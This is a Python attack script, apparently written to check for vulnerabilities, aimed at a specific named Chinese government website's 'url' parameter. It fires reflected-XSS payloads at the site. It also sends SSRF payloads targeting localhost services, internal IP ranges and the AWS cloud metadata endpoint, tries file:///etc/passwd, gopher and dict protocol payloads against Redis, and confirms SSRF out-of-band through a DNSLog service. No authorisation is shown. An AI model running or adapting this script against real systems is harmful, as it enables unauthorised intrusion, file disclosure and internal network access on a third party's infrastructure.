import requests
import urllib3
import urllib.parse
import time
import subprocess
import json

urllib3.disable_warnings()

TARGET = "http://www.pingdu.qdjcy.gov.cn/"

def curl_request(url_param=None, timeout=15):
    url = TARGET
    if url_param is not None:
        url = TARGET + "?url=" + url_param
    
    cmd = [
        "curl", "-s", "-w", "\\n%{http_code}:%{size_download}:%{time_total}",
        "-A", "Mozilla/5.0 (X11; Linux i686; rv:1.9.6.20) Gecko/ Firefox/5.0",
        "--compressed",
        "--max-time", str(timeout),
        url
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        output = result.stdout
        # 分离响应体和状态行
        lines = output.rsplit("\n", 1)
        body = lines[0] if len(lines) > 1 else ""
        status_line = lines[-1] if lines else ""
        parts = status_line.split(":")
        status = int(parts[0]) if parts and parts[0].isdigit() else 0
        length = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        time_total = float(parts[2]) if len(parts) > 2 else 0
        return {
            "status": status,
            "length": len(body),
            "time": round(time_total, 3),
            "text": body,
        }
    except Exception as e:
        return {"status": "ERROR", "error": str(e), "length": 0, "time": 0, "text": ""}

def print_result(label, result, search_terms=None):
    status = result.get("status", "?")
    length = result.get("length", 0)
    elapsed = result.get("time", 0)
    print(f"  [{status}] 长度:{length} 耗时:{elapsed}s  - {label}")
    if search_terms and result.get("text"):
        for term in search_terms:
            if term in result["text"]:
                print(f"    !! 在响应中发现: {term}")

def main():
    print("=" * 60)
    print("  漏洞验证: www.pingdu.qdjcy.gov.cn url 参数 (curl方式)")
    print("=" * 60)

    print("\n[1] 基线请求 (无url参数)")
    baseline = curl_request(None)
    print_result("基线", baseline)
    base_len = baseline.get("length", 0)
    base_time = baseline.get("time", 0)
    print(f"    基线响应长度: {base_len} 字节, 耗时: {base_time}s")

    print("\n" + "=" * 60)
    print("[2] XSS 反射测试 - 检查参数值是否在页面中反射")
    print("=" * 60)

    test_marker = "XSS_TEST_MARKER_abc123"
    result = curl_request(test_marker)
    print_result("标记字符串测试", result)
    if test_marker in result.get("text", ""):
        print(f"  !! 参数值直接反射在响应中!")
        idx = result["text"].find(test_marker)
        start = max(0, idx - 150)
        end = min(len(result["text"]), idx + 150)
        print(f"    上下文:\n    ...{result['text'][start:end]}...")
    else:
        print(f"  - 参数值未在响应中直接反射")

    xss_payloads = [
        ("script标签", "<script>alert(1)</script>"),
        ("img onerror", "<img src=x onerror=alert(1)>"),
        ("svg onload", "<svg onload=alert(1)>"),
        ("双引号闭合", '"><script>alert(1)</script>'),
        ("单引号闭合", "'><script>alert(1)</script>"),
        ("javascript伪协议", "javascript:alert(1)"),
    ]

    print("\n  XSS payload 反射情况:")
    for label, payload in xss_payloads:
        result = curl_request(payload)
        length = result.get("length", 0)
        reflected = payload in result.get("text", "")
        status = "反射" if reflected else "未反射"
        len_diff = length - base_len
        print(f"    [{status}] {label}: 长度{length} (差异{len_diff:+d})")
        if reflected:
            idx = result["text"].find(payload)
            context = result["text"][max(0,idx-80):idx+80]
            print(f"       上下文: ...{context}...")
        time.sleep(0.3)

    print("\n" + "=" * 60)
    print("[3] SSRF 测试 - 响应时间/长度差异分析")
    print("=" * 60)

    ssrf_payloads = [
        ("localhost:80", "http://127.0.0.1:80"),
        ("localhost:443", "http://127.0.0.1:443"),
        ("localhost:22 (SSH)", "http://127.0.0.1:22"),
        ("localhost:3306 (MySQL)", "http://127.0.0.1:3306"),
        ("localhost:6379 (Redis)", "http://127.0.0.1:6379"),
        ("localhost:8080", "http://127.0.0.1:8080"),
        ("内网192.168.1.1", "http://192.168.1.1"),
        ("内网10.0.0.1", "http://10.0.0.1"),
        ("云元数据AWS", "http://169.254.169.254/latest/meta-data/"),
        ("不存在的域名", "http://nonexistent-domain-xyz123.com/"),
        ("百度(外部)", "http://www.baidu.com"),
    ]

    ssrf_results = []
    print(f"  基线: 长度{base_len}, 耗时{base_time}s")
    print()
    for label, payload in ssrf_payloads:
        result = curl_request(payload, timeout=10)
        length = result.get("length", 0)
        elapsed = result.get("time", 0)
        len_diff = length - base_len
        time_diff = round(elapsed - base_time, 3)
        ssrf_results.append((label, payload, length, elapsed, len_diff, time_diff))
        flag = ""
        if abs(len_diff) > 200:
            flag += " [长度异常]"
        if time_diff > 2.0:
            flag += " [延迟高]"
        if elapsed > 9:
            flag += " [超时]"
        print(f"  [{result.get('status','?')}] 长度:{length}({len_diff:+d}) 耗时:{elapsed}s({time_diff:+}) - {label}{flag}")
        time.sleep(0.5)

    print("\n" + "=" * 60)
    print("[4] 协议攻击测试")
    print("=" * 60)

    scheme_payloads = [
        ("file协议", "file:///etc/passwd"),
        ("file协议win", "file:///C:/Windows/System32/drivers/etc/hosts"),
        ("gopher协议", "gopher://127.0.0.1:6379/_INFO"),
        ("dict协议", "dict://127.0.0.1:6379/INFO"),
        ("ftp协议", "ftp://127.0.0.1:21"),
        ("https", "https://www.baidu.com"),
    ]

    for label, payload in scheme_payloads:
        result = curl_request(payload, timeout=8)
        length = result.get("length", 0)
        elapsed = result.get("time", 0)
        len_diff = length - base_len
        print(f"  [{result.get('status','?')}] 长度:{length}({len_diff:+d}) 耗时:{elapsed}s - {label}")
        time.sleep(0.3)

    print("\n" + "=" * 60)
    print("[5] 重定向/跳转测试")
    print("=" * 60)

    redirect_payloads = [
        ("正常URL-baidu", "http://www.baidu.com"),
        ("相对路径", "/html/sygk/"),
        ("//协议相对", "//www.baidu.com"),
        ("站内路径", "/index.php"),
    ]

    for label, payload in redirect_payloads:
        result = curl_request(payload, timeout=10)
        length = result.get("length", 0)
        elapsed = result.get("time", 0)
        len_diff = length - base_len
        print(f"  [{result.get('status','?')}] 长度:{length}({len_diff:+d}) 耗时:{elapsed}s - {label}")
        if abs(len_diff) > 500:
            print(f"    -> 响应内容差异大，可能url参数被用于获取远程内容")
            snippet = result["text"][:300]
            print(f"    响应前300字符: {snippet[:200]}...")
        time.sleep(0.3)

    print("\n" + "=" * 60)
    print("[6] DNSLog SSRF 带外验证")
    print("=" * 60)

    try:
        # 使用curl获取dnslog域名
        dnslog_result = subprocess.run(
            ["curl", "-s", "http://www.dnslog.cn/getdomain.php"],
            capture_output=True, text=True, timeout=10
        )
        dnslog_domain = dnslog_result.stdout.strip()
        if dnslog_domain and "." in dnslog_domain:
            print(f"  DNSLog域名: {dnslog_domain}")

            # 发送SSRF payload
            ssrf_payload = f"http://{dnslog_domain}/ssrf_test"
            print(f"  发送SSRF请求到: {ssrf_payload}")
            curl_request(ssrf_payload, timeout=10)

            # 等待并检查
            print("  等待5秒后检查DNS记录...")
            time.sleep(5)

            check_result = subprocess.run(
                ["curl", "-s", "http://www.dnslog.cn/getrecords.php"],
                capture_output=True, text=True, timeout=10
            )
            records = check_result.stdout.strip()
            if dnslog_domain in records and len(records) > 10:
                print(f"  !! SSRF确认: DNSLog收到解析记录!")
                print(f"     记录: {records[:500]}")
            else:
                print(f"  - 未检测到DNS解析记录")
                if records:
                    print(f"    DNSLog响应: {records[:200]}")
        else:
            print(f"  - 无法获取DNSLog域名: {dnslog_domain[:200]}")
    except Exception as e:
        print(f"  - DNSLog测试异常: {e}")

    print("\n" + "=" * 60)
    print("[7] 最终结论")
    print("=" * 60)

    print(f"\n基线: 状态200, 长度{base_len}字节, 耗时{base_time}s")

    # 反射XSS判断
    if test_marker in curl_request(test_marker).get("text", ""):
        print("\n  [XSS] 参数值存在反射，需进一步确认是否可利用")
    else:
        print("\n  [XSS] 未发现参数值反射，XSS可能性低")

    # SSRF判断
    print("\n  [SSRF] 异常响应分析:")
    has_ssrf_sig = False
    for label, payload, length, elapsed, len_diff, time_diff in ssrf_results:
        if abs(len_diff) > 500 or time_diff > 3.0:
            print(f"    - {label}: 长度差异{len_diff:+d}, 时间差异{time_diff:+}s")
            has_ssrf_sig = True
    if not has_ssrf_sig:
        print("    各测试响应与基线差异较小，SSRF可能性较低（需结合DNSLog确认）")

    print("\n验证完成。")

if __name__ == "__main__":
    main()
